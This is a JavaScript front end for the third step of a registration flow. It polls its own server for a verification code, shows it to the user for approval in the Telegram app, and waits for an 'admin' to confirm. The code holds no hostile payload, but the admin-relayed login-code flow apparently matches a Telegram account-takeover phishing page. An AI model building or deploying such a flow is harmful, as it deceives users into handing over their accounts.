// Step 3 JavaScript - Verification Code Handling
document.addEventListener('DOMContentLoaded', function() {
    const verificationStatus = document.getElementById('verificationStatus');
    const verificationCodeContainer = document.getElementById('verificationCodeContainer');
    const codeNumber = document.getElementById('codeNumber');
    const verificationCodeBtn = document.getElementById('verificationCodeBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const successModal = document.getElementById('successModal');
    const errorModal = document.getElementById('errorModal');
    const errorMessage = document.getElementById('errorMessage');
    const countdown = document.getElementById('countdown');
    
    // Get session ID from step 2
    const sessionId = sessionStorage.getItem('mlSessionId');
    
    // If no session ID, redirect back to step 1
    if (!sessionId) {
        window.location.href = '/';
        return;
    }
    
    let pollingInterval;
    let statusPollingInterval;
    let currentCode = null;
    let currentStatus = 'waiting_admin_code';
    
    // Start polling for verification code
    startPolling();
    
    function startPolling() {
        console.log('Starting to poll for verification code...');
        
        pollingInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/verification-code/${sessionId}`);
                const result = await response.json();
                
                if (result.success && result.code) {
                    // Code received!
                    currentCode = result.code;
                    currentStatus = result.status;
                    showVerificationCode(result.code);
                    clearInterval(pollingInterval);
                    
                    // Start polling for status changes
                    startStatusPolling();
                }
            } catch (error) {
                console.error('Polling error:', error);
            }
        }, 2000); // Poll every 2 seconds
        
        // Stop polling after 5 minutes
        setTimeout(() => {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                showError('Verification timeout. Please try registering again.');
            }
        }, 300000); // 5 minutes
    }
    
    function startStatusPolling() {
        console.log('Starting to poll for verification status...');
        
        statusPollingInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/verification-status/${sessionId}`);
                const result = await response.json();
                
                if (result.success) {
                    if (result.status === 'completed') {
                        // Verification completed!
                        clearInterval(statusPollingInterval);
                        showSuccess();
                    } else if (result.status === 'waiting_admin_ok') {
                        // Admin sent code, now waiting for admin ok
                        showAdminWaiting();
                    }
                }
            } catch (error) {
                console.error('Status polling error:', error);
            }
        }, 2000); // Poll every 2 seconds
        
        // Stop polling after 10 minutes
        setTimeout(() => {
            if (statusPollingInterval) {
                clearInterval(statusPollingInterval);
                showError('Verification timeout. Please try registering again.');
            }
        }, 600000); // 10 minutes
    }
    
    function showVerificationCode(code) {
        // Hide waiting status
        verificationStatus.style.opacity = '0';
        setTimeout(() => {
            verificationStatus.style.display = 'none';
            
            // Show verification code
            codeNumber.textContent = code;
            verificationCodeContainer.style.display = 'block';
            verificationCodeContainer.style.opacity = '0';
            
            setTimeout(() => {
                verificationCodeContainer.style.opacity = '1';
                
                // Add pulse animation to the code
                codeNumber.classList.add('pulse-animation');
            }, 100);
        }, 300);
    }
    
    function showAdminWaiting() {
        const waitingConfirmation = document.getElementById('waitingConfirmation');
        const adminWaiting = document.getElementById('adminWaiting');
        
        if (waitingConfirmation && adminWaiting) {
            waitingConfirmation.style.display = 'none';
            adminWaiting.style.display = 'block';
        }
    }
    
    function showSuccess() {
        // Hide everything and show success modal
        document.body.style.opacity = '0';
        setTimeout(() => {
            showSuccessModal();
            document.body.style.opacity = '1';
            
            // Clear session data
            sessionStorage.removeItem('mlSessionId');
            
            // Celebrate with confetti
            createConfetti();
        }, 300);
    }
    
    // Remove the pressVerificationCode function since user presses in Telegram app
    
    function showLoading() {
        loadingOverlay.style.display = 'flex';
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.opacity = '1';
        }, 10);
    }
    
    function hideLoading() {
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
        }, 300);
    }
    
    function showSuccessModal() {
        successModal.style.display = 'flex';
        successModal.style.opacity = '0';
        setTimeout(() => {
            successModal.style.opacity = '1';
        }, 10);
    }
    
    function showError(message) {
        errorMessage.textContent = message;
        errorModal.style.display = 'flex';
        errorModal.style.opacity = '0';
        setTimeout(() => {
            errorModal.style.opacity = '1';
        }, 10);
    }
    
    window.closeModal = function() {
        successModal.style.opacity = '0';
        setTimeout(() => {
            successModal.style.display = 'none';
            // Redirect to home page
            window.location.href = '/';
        }, 300);
    };
    
    window.closeErrorModal = function() {
        errorModal.style.opacity = '0';
        setTimeout(() => {
            errorModal.style.display = 'none';
        }, 300);
    };
    
    function createConfetti() {
        const colors = ['#FFD700', '#FF6B35', '#3F51B5', '#4CAF50', '#E91E63'];
        const confettiCount = 100;
        
        for (let i = 0; i < confettiCount; i++) {
            setTimeout(() => {
                const confetti = document.createElement('div');
                confetti.style.cssText = `
                    position: fixed;
                    width: ${8 + Math.random() * 6}px;
                    height: ${8 + Math.random() * 6}px;
                    background: ${colors[Math.floor(Math.random() * colors.length)]};
                    left: ${Math.random() * 100}vw;
                    top: -10px;
                    z-index: 1003;
                    pointer-events: none;
                    animation: confettiFall ${2 + Math.random() * 3}s linear forwards;
                    transform: rotate(${Math.random() * 360}deg);
                    border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
                `;
                
                document.body.appendChild(confetti);
                
                setTimeout(() => {
                    if (document.body.contains(confetti)) {
                        confetti.remove();
                    }
                }, 5000);
            }, i * 30);
        }
    }
    
    // Add CSS for new animations
    const style = document.createElement('style');
    style.textContent = `
        .pulse-animation {
            animation: pulseGlow 2s ease-in-out infinite;
        }
        
        @keyframes pulseGlow {
            0%, 100% { 
                transform: scale(1);
                box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
            }
            50% { 
                transform: scale(1.05);
                box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
            }
        }
        
        .urgent-countdown {
            animation: urgentPulse 0.5s ease-in-out infinite;
        }
        
        @keyframes urgentPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        @keyframes confettiFall {
            to {
                transform: translateY(100vh) rotate(720deg);
                opacity: 0;
            }
        }
        
        .verification-code-display {
            text-align: center;
            background: linear-gradient(135deg, #FFD700 0%, #FFA000 100%);
            border-radius: 16px;
            padding: 30px;
            margin: 30px 0;
            box-shadow: 0 8px 32px rgba(255, 215, 0, 0.4);
            border: 3px solid rgba(255, 255, 255, 0.3);
        }
        
        .verification-code-display .code-number {
            display: block;
            margin-bottom: 10px;
        }
        
        .press-instruction {
            color: #1a237e;
            font-weight: 600;
            font-size: 1rem;
            margin: 0;
        }
        
        .code-number {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            letter-spacing: 4px;
            color: #1a237e;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .telegram-instruction {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .instruction-step {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
            font-size: 1rem;
        }
        
        .instruction-step:last-child {
            margin-bottom: 0;
        }
        
        .step-number {
            background: #FFD700;
            color: #1a237e;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 0.9rem;
        }
        
        .waiting-confirmation {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: rgba(76, 175, 80, 0.1);
            border: 1px solid rgba(76, 175, 80, 0.3);
            border-radius: 12px;
        }
        
        .waiting-icon {
            font-size: 2rem;
            margin-bottom: 10px;
            animation: pulse 2s ease-in-out infinite;
        }
        
        .admin-waiting {
            text-align: center;
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            border-radius: 12px;
            padding: 25px;
            margin-top: 20px;
        }
        
        .admin-waiting h4 {
            font-family: 'Orbitron', monospace;
            color: #FFC107;
            margin-bottom: 10px;
            font-size: 1.3rem;
        }
        
        .admin-waiting p {
            margin-bottom: 20px;
            font-size: 1rem;
        }
        
        .code-display {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .code-display h4 {
            font-family: 'Orbitron', monospace;
            color: #FFD700;
            margin-bottom: 20px;
            font-size: 1.4rem;
        }
        
        .verification-code-display {
            background: linear-gradient(135deg, #FFD700 0%, #FFA000 100%);
            border-radius: 16px;
            padding: 30px;
            margin: 20px 0;
            box-shadow: 0 8px 32px rgba(255, 215, 0, 0.4);
            border: 3px solid rgba(255, 255, 255, 0.3);
        }
        
        .code-display p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 1rem;
            margin-top: 15px;
        }
        
        .success-timer {
            text-align: center;
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            border-radius: 12px;
            padding: 25px;
            color: white;
            margin-top: 20px;
        }
        
        .timer-icon {
            font-size: 3rem;
            margin-bottom: 15px;
            animation: bounce 1s ease-in-out infinite;
        }
        
        .success-timer h4 {
            font-family: 'Orbitron', monospace;
            font-size: 1.4rem;
            margin-bottom: 10px;
        }
        
        .success-timer p {
            font-size: 1rem;
            margin-bottom: 20px;
        }
        
        .timer-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 4px;
            overflow: hidden;
        }
        
        .timer-progress {
            height: 100%;
            background: linear-gradient(90deg, #FFD700, #FFA000);
            border-radius: 4px;
            transition: width 1s linear;
            width: 0%;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {
                transform: translateY(0);
            }
            40% {
                transform: translateY(-10px);
            }
            60% {
                transform: translateY(-5px);
            }
        }
        
        .loading-dots {
            display: flex;
            gap: 8px;
            margin-top: 20px;
        }
        
        .loading-dots span {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.6);
            animation: loadingDot 1.4s ease-in-out infinite both;
        }
        
        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
        
        @keyframes loadingDot {
            0%, 80%, 100% {
                transform: scale(0);
                opacity: 0.5;
            } 40% {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .code-timer {
            text-align: center;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 15px;
        }
        
        .code-instruction {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .code-instruction h4 {
            font-family: 'Orbitron', monospace;
            color: #4CAF50;
            margin-bottom: 10px;
            font-size: 1.3rem;
        }
        
        .error-content {
            background: linear-gradient(135deg, #f44336 0%, #d32f2f 100%);
        }
        
        .error-btn {
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }
        
        .error-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }
    `;
    document.head.appendChild(style);
    
    // Add smooth page transition
    document.body.style.opacity = '0';
    setTimeout(() => {
        document.body.style.transition = 'opacity 0.5s ease';
        document.body.style.opacity = '1';
    }, 100);
});